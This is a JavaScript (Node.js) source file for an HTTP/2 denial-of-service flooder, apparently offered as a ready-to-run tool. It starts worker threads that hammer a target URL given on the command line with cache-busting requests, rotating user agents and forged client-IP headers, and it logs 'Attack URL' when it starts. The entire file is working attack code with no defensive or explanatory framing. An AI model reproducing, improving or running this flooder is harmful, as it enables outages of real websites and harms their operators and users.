const http2 = require('http2');
const url = require('url');
const { Worker, isMainThread, workerData } = require('worker_threads');
const os = require('os');
const crypto = require('crypto');

const MAX_RAM_PERCENTAGE = 80;
const TIMEOUT_MS = 120 * 1000;
const MAX_REQUESTS_PER_SECOND = 7500000000;

function getRandomIP() {
    return (
        Math.floor(Math.random() * 256) + "." +
        Math.floor(Math.random() * 256) + "." +
        Math.floor(Math.random() * 256) + "." +
        Math.floor(Math.random() * 256)
    );
}

function getRandomUserAgent() {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function generateRandomString(minLength, maxLength) {
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return crypto.randomBytes(length).toString('hex');
}

async function makeRequest(targetUrl) {
    const parsedTarget = new URL(targetUrl);
    const encodingHeader = ["gzip", "deflate", "br"];
    const cacheHeader = ["no-cache", "no-store", "must-revalidate"];
    const fetchMode = ["cors", "navigate", "same-origin"];
    const fetchSite = ["same-origin", "none", "cross-site"];
    const fetchDest = ["document", "image", "script"];
    const userAgent = getRandomUserAgent();
    
    const headers = {
        ':scheme': 'https',
        ':authority': parsedTarget.host,
        ':path': parsedTarget.pathname + "?" + generateRandomString(3, 10) + "=" + generateRandomString(10, 25),
        ':method': 'GET',
        'pragma': 'no-cache',
        'upgrade-insecure-requests': '1',
        'accept-encoding': encodingHeader[Math.floor(Math.random() * encodingHeader.length)],
        'cache-control': cacheHeader[Math.floor(Math.random() * cacheHeader.length)],
        'sec-fetch-mode': fetchMode[Math.floor(Math.random() * fetchMode.length)],
        'sec-fetch-site': fetchSite[Math.floor(Math.random() * fetchSite.length)],
        'sec-fetch-dest': fetchDest[Math.floor(Math.random() * fetchDest.length)],
        'user-agent': userAgent,
        'x-forwarded-for': getRandomIP(),
        'x-forwarded-host': getRandomIP(),
        'client-ip': getRandomIP(),
        'real-ip': getRandomIP(),
        'via': '1.1 ' + getRandomIP(),
        'referer': parsedTarget.origin,
        'origin': parsedTarget.origin,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    };

    const client = http2.connect(parsedTarget.origin);

    const sendRequest = async () => {
        return new Promise((resolve, reject) => {
            const req = client.request(headers);

            req.on('response', (headers, flags) => {
                let data = '';
                req.on('data', chunk => data += chunk);
                req.on('end', () => {
                    resolve();
                });
            });

            req.on('error', err => {
                console.error(`Error sending request: ${err.message}`);
                reject(err);
            });

            req.end();
        });
    };

    const floodRequests = () => {
        setInterval(async () => {
            for (let i = 0; i < MAX_REQUESTS_PER_SECOND; i++) {
                await sendRequest();
            }
        }, 1);
    };

    floodRequests();
}

const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;

    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        console.log('Maximum RAM usage:', ramPercentage.toFixed(2), '%');
        restartScript();
    }
};

const restartScript = () => {
    process.exit(0);
};

const exitScriptAfterTimeout = (timeout) => {
    setTimeout(() => {
        console.log('Timeout reached. Exiting script.');
        process.exit(0);
    }, timeout);
};

if (!isMainThread) {
    const { targetUrl } = workerData;
    makeRequest(targetUrl);
}

if (isMainThread) {
    const args = process.argv.slice(2);
    const targetUrl = args[0];
    const timeout = parseInt(args[1], 10) * 1000 || TIMEOUT_MS;
    const numThreads = parseInt(args[2], 10);

    if (!targetUrl || isNaN(timeout) || isNaN(numThreads)) {
        console.error('Usage: host time thraed');
        process.exit(1);
    }

    console.log(`Attack URL: ${targetUrl} Time: ${timeout / 1000}s Threads: ${numThreads}`);

    for (let i = 0; i < numThreads; i++) {
        new Worker(__filename, { workerData: { targetUrl } });
    }
    setInterval(handleRAMUsage, 5000);
    exitScriptAfterTimeout(timeout);
}
